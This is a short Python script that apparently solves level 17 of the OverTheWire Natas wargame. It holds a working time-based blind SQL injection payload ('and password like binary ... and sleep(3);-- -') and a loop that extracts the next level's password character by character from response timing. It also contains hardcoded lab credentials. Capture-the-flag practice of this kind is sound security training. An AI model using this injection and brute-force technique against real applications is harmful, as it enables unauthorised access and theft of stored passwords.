import requests
from datetime import datetime, timedelta
from requests.auth import HTTPBasicAuth
from urllib.parse import quote

# $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 

auth = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
host = 'http://natas17.natas.labs.overthewire.org'

def get_password(password):
    return f'natas18" and password like binary "{password}" and sleep (3);-- -'

def send_request(password):
    data= {
            'username': get_password(password)
            }
    start_time = datetime.now()
    req = requests.post(f'{host}', data=data, auth=auth)
    total_time = datetime.now() - start_time
    if total_time > timedelta(seconds=3):
        return True
    else:
        return False

special_characters = ['_', '%', '?', '\\', '^', '"', '\'']
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

password = 'xvKIqDjy4OPv7wCRg'
password = 'xvKIqDjy4OPv7wCRgDl'
while True:
    if send_request(password):
        break
    """for i in range(33, 123):
        current = ''
        if chr(i) in special_characters:
            current = f'\{chr(i)}'
        else:
            current = f'{chr(i)}'
    """
    for current in characters:
        found_char = send_request(f'{password}{current}%')
        print(f'\r{password}{current}', flush=False, end=' ')
        if found_char:
            password += current
            break
